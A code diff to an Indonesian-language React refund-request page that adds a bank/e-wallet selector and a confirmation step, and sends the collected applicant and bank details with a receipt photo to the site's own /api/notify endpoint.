@@ -13,6 +13,8 @@ import {
   ChevronLeft,
   ShieldCheck,
   Loader2,
+  Banknote,
+  ClipboardCheck,
 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import { clsx, type ClassValue } from "clsx";
@@ -28,6 +30,23 @@ const STEPS = [
   { id: 2, title: "Pesanan", icon: FileText },
   { id: 3, title: "Rekening", icon: CreditCard },
   { id: 4, title: "Bukti", icon: Upload },
+  { id: 5, title: "Konfirmasi", icon: ClipboardCheck },
+];
+
+const BANKS = [
+  "BCA",
+  "BNI",
+  "BRI",
+  "Mandiri",
+  "BSI",
+  "CIMB Niaga",
+  "Danamon",
+  "Permata",
+  "BTPN",
+  "DANA",
+  "OVO",
+  "GoPay",
+  "ShopeePay",
 ];
 
 export default function RefundPage() {
@@ -43,15 +62,24 @@ export default function RefundPage() {
     phoneNumber: "",
     receiptNumber: "",
     address: "",
+    bankName: "",
     bankAccountNumber: "",
     bankAccountHolder: "",
+    agreed: false,
   });
 
   const handleInputChange = (
-    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>,
+    e: React.ChangeEvent<
+      HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement
+    >,
   ) => {
-    const { name, value } = e.target;
-    setFormData((prev) => ({ ...prev, [name]: value }));
+    const { name, value, type } = e.target;
+    if (type === "checkbox") {
+      const checked = (e.target as HTMLInputElement).checked;
+      setFormData((prev) => ({ ...prev, [name]: checked }));
+    } else {
+      setFormData((prev) => ({ ...prev, [name]: value }));
+    }
   };
 
   const handleFileChange = (selectedFile: File | null) => {
@@ -93,21 +121,66 @@ export default function RefundPage() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (!formData.agreed) return;
+
     setIsSubmitting(true);
 
-    // Simulate API call
-    await new Promise((resolve) => setTimeout(resolve, 2000));
+    const pesan = `
+*PENGAJUAN REFUND BARU* 📦
+    
+👤 *Biodata:*
+- Nama: ${formData.fullName}
+- WA: ${formData.phoneNumber}
 
-    setIsSubmitting(false);
-    setIsSuccess(true);
+📦 *Pesanan:*
+- Resi: ${formData.receiptNumber}
+- Alamat: ${formData.address}
+
+💳 *Rekening:*
+- Bank: ${formData.bankName}
+- No. Rek: ${formData.bankAccountNumber}
+- Atas Nama: ${formData.bankAccountHolder}
+
+✅ *Status Konfirmasi:* Telah Disetujui
+    `.trim();
+
+    try {
+      const formDataToSend = new FormData();
+      formDataToSend.append("pesan", pesan);
+      if (file) {
+        formDataToSend.append("file", file);
+      }
+
+      const res = await fetch("/api/notify", {
+        method: "POST",
+        body: formDataToSend,
+      });
+
+      if (res.ok) {
+        setIsSuccess(true);
+      } else {
+        const errorData = await res.json();
+        alert(`Gagal mengirim: ${errorData.details || "Silakan coba lagi"}`);
+      }
+    } catch (err) {
+      console.error("Submission Error:", err);
+      alert("Terjadi kesalahan koneksi atau server.");
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   const isNextDisabled = () => {
     if (currentStep === 1) return !formData.fullName || !formData.phoneNumber;
     if (currentStep === 2) return !formData.receiptNumber || !formData.address;
     if (currentStep === 3)
-      return !formData.bankAccountNumber || !formData.bankAccountHolder;
+      return (
+        !formData.bankName ||
+        !formData.bankAccountNumber ||
+        !formData.bankAccountHolder
+      );
     if (currentStep === 4) return !file;
+    if (currentStep === 5) return !formData.agreed;
     return false;
   };
 
@@ -127,7 +200,7 @@ export default function RefundPage() {
           </h2>
           <p className="text-gray-500 font-medium mb-10 leading-relaxed">
             Pengajuan refund Anda telah diterima dan akan segera kami
-            verifikasi.
+            verifikasi. Mohon tunggu informasi selanjutnya.
           </p>
           <button
             onClick={() => window.location.reload()}
@@ -224,7 +297,7 @@ export default function RefundPage() {
                         INFORMASI PRIBADI
                       </h2>
                       <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">
-                        Langkah 1 dari 4
+                        Langkah 1 dari 5
                       </p>
                     </div>
                     <div className="space-y-6">
@@ -264,7 +337,7 @@ export default function RefundPage() {
                         DETAIL PENGIRIMAN
                       </h2>
                       <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">
-                        Langkah 2 dari 4
+                        Langkah 2 dari 5
                       </p>
                     </div>
                     <div className="space-y-6">
@@ -305,7 +378,7 @@ export default function RefundPage() {
                         REKENING REFUND
                       </h2>
                       <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">
-                        Langkah 3 dari 4
+                        Langkah 3 dari 5
                       </p>
                     </div>
                     <div className="space-y-6">
@@ -315,6 +388,24 @@ export default function RefundPage() {
                           PASTIKAN NOMOR REKENING BENAR UNTUK KEPERLUAN TRANSFER
                           BALIK DANA ANDA.
                         </p>
+                      </div>
+                      <div className="space-y-2">
+                        <label className="text-xs font-black text-black uppercase tracking-widest ml-1">
+                          Pilih Bank / E-Wallet
+                        </label>
+                        <select
+                          name="bankName"
+                          value={formData.bankName}
+                          onChange={handleInputChange}
+                          className="w-full bg-gray-50 border-2 border-transparent focus:border-[#FE2C55] focus:bg-white rounded-2xl px-5 py-4 font-bold text-black transition-all outline-none shadow-sm appearance-none cursor-pointer"
+                        >
+                          <option value="">-- Pilih Bank --</option>
+                          {BANKS.map((bank) => (
+                            <option key={bank} value={bank}>
+                              {bank}
+                            </option>
+                          ))}
+                        </select>
                       </div>
                       <div className="space-y-2">
                         <label className="text-xs font-black text-black uppercase tracking-widest ml-1">
@@ -349,10 +440,10 @@ export default function RefundPage() {
                   <div className="space-y-8">
                     <div className="space-y-2">
                       <h2 className="text-2xl font-black text-black tracking-tight">
-                        UNGGAH BUKTI
+                        UNGGAH FOTO RESI
                       </h2>
                       <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">
-                        Langkah 4 dari 4
+                        Langkah 4 dari 5
                       </p>
                     </div>
                     <div
@@ -395,7 +486,7 @@ export default function RefundPage() {
                             <Upload className="w-10 h-10 text-white" />
                           </div>
                           <p className="text-black font-black text-lg mb-2 tracking-tight">
-                            TARUH FOTO RESI
+                            UPLOAD FOTO RESI
                           </p>
                           <p className="text-gray-400 text-[10px] font-black uppercase tracking-[0.2em] mb-8">
                             PNG ATAU JPG (MAKS 5MB)
@@ -415,6 +506,76 @@ export default function RefundPage() {
                         </>
                       )}
                     </div>
+                  </div>
+                )}
+
+                {/* STEP 5: KONFIRMASI */}
+                {currentStep === 5 && (
+                  <div className="space-y-8">
+                    <div className="space-y-2">
+                      <h2 className="text-2xl font-black text-black tracking-tight">
+                        KONFIRMASI DATA
+                      </h2>
+                      <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">
+                        Langkah Tautan Terakhir
+                      </p>
+                    </div>
+
+                    <div className="bg-gray-50 rounded-3xl p-6 space-y-4 border border-gray-100">
+                      <div className="flex items-start gap-3">
+                        <User className="w-5 h-5 text-[#FE2C55] shrink-0 mt-1" />
+                        <div>
+                          <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest leading-none mb-1">
+                            Penerima
+                          </p>
+                          <p className="text-sm font-black text-black">
+                            {formData.fullName} ({formData.phoneNumber})
+                          </p>
+                        </div>
+                      </div>
+                      <div className="flex items-start gap-3">
+                        <FileText className="w-5 h-5 text-[#FE2C55] shrink-0 mt-1" />
+                        <div>
+                          <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest leading-none mb-1">
+                            No. Resi & Alamat
+                          </p>
+                          <p className="text-sm font-black text-black">
+                            {formData.receiptNumber}
+                          </p>
+                          <p className="text-xs font-bold text-gray-500 leading-tight mt-1">
+                            {formData.address}
+                          </p>
+                        </div>
+                      </div>
+                      <div className="flex items-start gap-3">
+                        <Banknote className="w-5 h-5 text-[#FE2C55] shrink-0 mt-1" />
+                        <div>
+                          <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest leading-none mb-1">
+                            Tujuan Refund
+                          </p>
+                          <p className="text-sm font-black text-black">
+                            {formData.bankName} - {formData.bankAccountNumber}
+                          </p>
+                          <p className="text-xs font-bold text-gray-500 mt-1">
+                            A/N {formData.bankAccountHolder}
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+
+                    <label className="flex items-start gap-4 p-5 bg-red-50/50 rounded-3xl border border-red-100 cursor-pointer group hover:bg-red-50 transition-colors">
+                      <input
+                        type="checkbox"
+                        name="agreed"
+                        checked={formData.agreed}
+                        onChange={handleInputChange}
+                        className="w-6 h-6 mt-1 rounded-lg border-2 border-red-200 text-[#FE2C55] focus:ring-[#FE2C55] transition-all cursor-pointer"
+                      />
+                      <p className="text-xs font-bold text-black leading-relaxed">
+                        SAYA MENYATAKAN BAHWA DATA DI ATAS ADALAH BENAR DAN
+                        DAPAT DIPERTANGGUNGJAWABKAN UNTUK PROSES REFUND.
+                      </p>
+                    </label>
                   </div>
                 )}
               </motion.div>
@@ -450,7 +611,7 @@ export default function RefundPage() {
                   {isSubmitting ? (
                     <>
                       <Loader2 className="w-5 h-5 animate-spin" />
-                      MEMPROSES...
+                      MENGIRIM...
                     </>
                   ) : (
                     <>
